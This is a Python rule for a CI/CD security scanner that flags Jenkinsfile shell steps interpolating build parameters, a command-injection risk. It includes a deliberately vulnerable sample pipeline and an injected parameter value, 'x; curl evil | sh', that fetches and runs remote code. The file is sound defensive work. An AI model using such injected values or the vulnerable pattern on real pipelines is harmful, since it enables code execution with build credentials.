"""JF-036, shell steps must not interpolate a build parameter (`params.*`)."""
from __future__ import annotations

from ...base import Finding, Location, Severity
from ...rule import Rule
from ..base import Jenkinsfile
from ._helpers import PARAMS_TAINT_RE, SHELL_STEP_RE

RULE = Rule(
    id="JF-036",
    title="Script step interpolates a build parameter (params.*)",
    severity=Severity.HIGH,
    owasp=("CICD-SEC-4",),
    esf=("ESF-D-INJECTION",),
    cwe=("CWE-78",),
    recommendation=(
        "Don't splice `${params.X}` into a double-quoted `sh` / `bat` / "
        "`powershell` body. Single-quote the Groovy string so it isn't "
        "interpolated, and let the shell read the value from the "
        "environment: `withEnv([\"TAG=${params.TAG}\"]) { sh 'build "
        "--tag \"$TAG\"' }`. The single-quoted form passes the value as "
        "one literal argument instead of letting it break out of the "
        "command."
    ),
    docs_note=(
        "A Jenkins build parameter is set by whoever queues the run: "
        "anyone with Build permission, an upstream `build job:` passing "
        "`parameters:`, or a webhook / remote trigger. A `string` "
        "parameter is free-form text. When Groovy interpolates it into "
        "a double-quoted shell body (`sh \"deploy ${params.TARGET}\"`) "
        "the value is substituted *before* the shell parses the line, so "
        "`params.TARGET = 'x; curl evil | sh'` runs the injected command "
        "on the agent in the build's full credential context. This is "
        "the Jenkins peer of the GHA `${{ inputs.X }}` and ADO "
        "`${{ parameters.X }}` injection rules. Only double-quoted / "
        "triple-double-quoted bodies are flagged; single-quoted Groovy "
        "strings (`sh '... $params ...'`) don't interpolate and are "
        "safe. JF-002 covers the SCM-env-var (`$BRANCH_NAME`) variant "
        "and JF-033 the `withCredentials` secret-leak variant; this rule "
        "is specifically the build-parameter source."
    ),
    known_fp=(
        "A parameter consumed purely as data inside a double-quoted body "
        "(`sh \"echo ${params.NOTE}\"`) is still flagged: the double "
        "quotes let `$(...)` / backticks in the value execute, so it is "
        "genuinely injectable, not a false positive.",
    ),
    exploit_example=(
        "// Vulnerable: ``${params.IMAGE_TAG}`` is interpolated into the\n"
        "// double-quoted sh body before the shell parses it. A queued\n"
        "// build with IMAGE_TAG = ``x ; curl evil | sh ;`` runs the\n"
        "// injected command on the agent.\n"
        "pipeline {\n"
        "  agent any\n"
        "  parameters {\n"
        "    string(name: 'IMAGE_TAG', defaultValue: 'latest')\n"
        "  }\n"
        "  stages {\n"
        "    stage('build') {\n"
        "      steps {\n"
        "        sh \"docker build -t myapp:${params.IMAGE_TAG} .\"\n"
        "      }\n"
        "    }\n"
        "  }\n"
        "}\n"
        "\n"
        "// Safe: bind the parameter to an env var and reference it\n"
        "// through a single-quoted body, so the shell, not Groovy,\n"
        "// resolves it and the value stays one literal argument.\n"
        "pipeline {\n"
        "  agent any\n"
        "  parameters {\n"
        "    string(name: 'IMAGE_TAG', defaultValue: 'latest')\n"
        "  }\n"
        "  stages {\n"
        "    stage('build') {\n"
        "      steps {\n"
        "        withEnv([\"IMAGE_TAG=${params.IMAGE_TAG}\"]) {\n"
        "          sh 'docker build -t \"myapp:$IMAGE_TAG\" .'\n"
        "        }\n"
        "      }\n"
        "    }\n"
        "  }\n"
        "}"
    ),
)


def check(jf: Jenkinsfile) -> Finding:
    text = jf.text_no_comments or jf.text
    offenders: list[str] = []
    locations: list[Location] = []
    for m in SHELL_STEP_RE.finditer(text):
        # Single-quoted / triple-single bodies don't interpolate in
        # Groovy, so ``params.*`` inside them reaches the shell as a
        # literal, not as injected command text. Mirrors JF-002.
        if m.group("sq") is not None or m.group("triple_s") is not None:
            continue
        body = m.group("triple_d") or m.group("dq") or ""
        if PARAMS_TAINT_RE.search(body):
            line_no = text[: m.start()].count("\n") + 1
            offenders.append(f"line {line_no}")
            locations.append(Location(
                path=jf.path, start_line=line_no, end_line=line_no,
            ))
    passed = not offenders
    desc = (
        "No shell step interpolates a build parameter (params.*)."
        if passed else
        f"Shell step(s) at {', '.join(offenders)} interpolate a "
        f"build parameter (`${{params.X}}`) into a double-quoted "
        f"command. A value set by whoever queues the build executes "
        f"inline on the agent."
    )
    return Finding(
        check_id=RULE.id, title=RULE.title, severity=RULE.severity,
        resource=jf.path, description=desc,
        recommendation=RULE.recommendation, passed=passed,
        locations=locations,
    )
